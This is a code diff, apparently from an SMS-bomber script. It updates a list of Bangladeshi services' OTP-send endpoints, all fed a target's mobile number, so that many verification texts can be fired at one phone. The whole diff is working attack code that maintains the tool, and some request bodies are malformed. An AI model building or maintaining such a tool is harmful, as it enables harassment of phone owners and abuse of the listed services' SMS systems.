@@ -14,12 +14,12 @@ $(document).ready(() => {
             const APIS = [
                 {
                     method: "POST",
-                    url: `http://nesco.sslwireless.com/api/v1/login`,
-                    body: 'phone_number":${mobile}',
+                    url: `http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-${mobile}/operator-Robi/send`,
+                },
                 {
                     method: 'POST',
-                    url: "https://api.bongo-solutions.com/auth/api/login/send-otp",
-                    body: `msisdn=88${mobile}&operator=all`
+                    url: "http://robi.api.bongobd.com/api/login/send-otp",
+                    body: `'{"phone_number":"${mobile}"`
                 },
                 {
                     method: 'GET',
@@ -30,9 +30,9 @@ $(document).ready(() => {
                     url: `https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=${mobile}&countryPhoneCode=%2B88`
                 },
                 {
-                    url: "https://web-api.binge.buzz/api/v3/otp/send",
+                    url: "https://ss.binge.buzz/otp/send/login",
                     method: "POST",
-                    body: `phone=$88{mobile}`
+                    body: `phone=${mobile}`
                 }
 
             ];
